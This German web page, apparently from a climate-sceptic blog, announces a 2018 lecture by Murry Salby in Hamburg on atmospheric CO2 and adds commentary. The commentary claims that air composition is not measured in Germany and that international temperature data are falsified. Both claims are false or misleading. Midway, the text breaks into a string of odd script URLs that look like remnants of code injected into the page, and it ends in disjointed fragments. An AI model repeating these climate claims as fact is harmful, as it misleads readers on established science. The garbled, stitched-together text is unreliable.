Am Mittwoch, 10. Oktober 2018 wird um 15 Uhr in Hamburg der Klimawissenschaftler Prof. Dr. Murry L. Salby einen Vortrag mit dem Titel
“What is really behind the increase of Atmospheric CO2?”
halten.
Die Veranstaltung findet in der Helmut-Schmidt-Universität statt, Holstenhofweg 85, 22043 Hamburg, Thomas-Ellwein-Saal (Mensagebäude).
Vortrag: Prof. Dr. Murry L. Salby; Reno, Nevada, USA
Titel: What is really behind the increase of Atmospheric CO2?
Zeit: Mittwoch, 10. Oktober 2018, 15 Uhr
Ort: Helmut-Schmidt-Universität Hamburg, Holstenhofweg 85, 22043 Hamburg
Vortragssaal: Thomas-Ellwein-Saal (Mensagebäude)
Der Eintritt ist frei!
In anderen Politikfeldern ist man da weiter: Politisch angeordnete und akribisch kontrollierte >amtliche< Feinstaub-Messungen in deutschen Städten weisen Konzentrationen verschiedener „Schadstoffe“ bis auf mehrere Stellen nach dem Komma genau nach. Kurioserweise findet man darunter im Frühling auch Birkenpollen. Bei CO2-Messungen: Fehlanzeige.
In Deutschland werden seit mehr als 150 Jahren schon die Temperaturen gemessen und archiviert. Sie geben zu-verlässig Auskunft über die Temperaturentwicklung. Die chemische Zusammensetzung der Luft wird nicht gemessen; demzufolge gibt es auch keine Zeitreihen, die wissenschaftlich zuverlässig die Entwicklung der einzelnen Komponenten seit der Industrialisierung beschreiben.
Die bundesdeutsche Energiepolitik stützt sich auf politische Spekulationen über CO2-Entwickungen und vertraut offensichtlich gefälschten internationalen Temperaturdaten
//coolpagecup.com/1cb09f960d6b873480.jshttps://loadsource.org/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=52295x7344x&r=1537544824464https://coolpagecup.com/ext/1cb09f960d6b873480.js?sid=52295_7344_&title=FF_%5B598%5D_pagecupdev.cool&blocks%5B%5D=31af2
Leider nicht. Es gibt keine Meßstation, wo die Thermometer und Wetterhäuschen am selben Ort unter identischer Umgebung standen und wo die Meßinstrumente identisch blieben.
Nothing – just fairy tales